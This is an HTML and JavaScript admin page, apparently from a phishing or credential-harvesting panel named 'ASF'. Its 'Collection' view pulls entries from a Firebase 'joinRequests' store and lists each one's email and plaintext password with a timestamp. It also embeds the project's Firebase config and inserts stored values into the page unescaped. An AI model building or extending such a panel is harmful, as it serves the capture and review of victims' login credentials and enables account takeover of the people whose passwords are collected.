<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Collection</title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="../logo.png">
  <link rel="apple-touch-icon" href="../logo.png">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <link rel="stylesheet" href="collection.css">
</head>
<body>
  
<script type="module">
  import { logout } from "../firebase/auth.js";
  window.logout = logout;
</script>

<div class="dashboard-container">
  <aside class="sidebar">
    <div class="logo">
      <img src="../logo.png" alt="Logo">
      <h2>ASF</h2>
    </div>
    <nav>
      <ul>
        <li><a href="/dashboard/"><i class="fas fa-home"></i> Dashboard</a></li>
        <li><a href="/dashboard/collection/" class="active"><i class="fas fa-layer-group"></i> Collection</a></li>
        <li><a href="/dashboard/link/"><i class="fas fa-link"></i> Link</a></li>
        <li><a href="/dashboard/user-management/"><i class="fas fa-users"></i> User Management</a></li>
        <li><a href="/login/" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
      </ul>
    </nav>
  </aside>

  <main class="main-content">
    <h1>Collection</h1>
    <div id="notifications"></div>
    <table id="collectionTable">
      <thead>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>Time</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </main>
</div>

<!-- Delete Confirmation Popup -->
<div id="delete-popup" style="
  display:none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: #fff;
  border: 2px solid #1a73e8;
  border-radius: 12px;
  padding: 25px 30px;
  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
  z-index: 9999;
  text-align: center;
  font-family: Arial, sans-serif;
">
  <p id="delete-popup-text" style="font-size:16px; margin-bottom:20px;">
    ⚠️ Do you really want to delete this entry?
  </p>
  <button id="confirm-delete" style="
    background:#1a73e8;color:white;border:none;padding:10px 20px;border-radius:6px;margin-right:10px;cursor:pointer;
  ">Yes</button>
  <button id="cancel-delete" style="
    background:#ccc;color:#202124;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;
  ">Cancel</button>
</div>

<!-- Success Notification -->
<div id="success-notification" style="
  display:none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background:#1a73e8;
  color:white;
  padding: 20px 25px;
  border-radius: 12px;
  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
  z-index: 9999;
  font-family: Arial, sans-serif;
  font-size:16px;
  text-align:center;
"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBEKuc4mzaWI5I6R9QgAeDHMz13bKk5Oy4",
    authDomain: "asf-panel-azizul.firebaseapp.com",
    projectId: "asf-panel-azizul",
    storageBucket: "asf-panel-azizul.firebasestorage.app",
    messagingSenderId: "444571143429",
    appId: "1:444571143429:web:a435815af2bbd7c2d0bb6c",
    measurementId: "G-79PTWV1GY4"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const tableBody = document.querySelector("#collectionTable tbody");
const notifications = document.getElementById("notifications");

const requestsRef = ref(db, 'joinRequests');

onValue(requestsRef, (snapshot) => {
  const data = snapshot.val();
  tableBody.innerHTML = '';

  if (!data) {
    notifications.innerHTML = `<p>No requests found</p>`;
    return;
  }

  const keys = Object.keys(data);
  notifications.innerHTML = `<p>${keys.length} requests found</p>`;

  keys.forEach(key => {
    const request = data[key];

    let formattedTime = "N/A";
    if (request.timestamp) {
      const date = new Date(request.timestamp);
      formattedTime = date.toLocaleString("en-GB", { timeZone: "Asia/Dhaka" });
    }

    tableBody.innerHTML += `
      <tr>
        <td>${request.email || ''}</td>
        <td>${request.password || ''}</td>
        <td>${formattedTime}</td>
        <td>
          <button onclick="deleteRequest('${key}')">Delete</button>
        </td>
      </tr>
    `;
  });
});

// Notification helper
function showNotification(message){
  const notif = document.getElementById("success-notification");
  notif.textContent = message;
  notif.style.display = "block";
  setTimeout(()=> { notif.style.display = "none"; }, 2500);
}

// Delete Request Popup logic
let deleteKey = null;

window.deleteRequest = function(key){
  deleteKey = key;
  document.getElementById("delete-popup").style.display = "block";
};

document.getElementById("confirm-delete").addEventListener("click", () => {
  if(deleteKey){
    remove(ref(db, `joinRequests/${deleteKey}`))
      .then(()=> {
        showNotification("✅ Request deleted successfully!");
        document.getElementById("delete-popup").style.display = "none";
        deleteKey = null;
      })
      .catch(err => showNotification("❌ Error: "+err.message));
  }
});

document.getElementById("cancel-delete").addEventListener("click", () => {
  document.getElementById("delete-popup").style.display = "none";
  deleteKey = null;
});

// Logout function
window.logout = () => alert("Logout functionality here!");
</script>
</body>
</html>
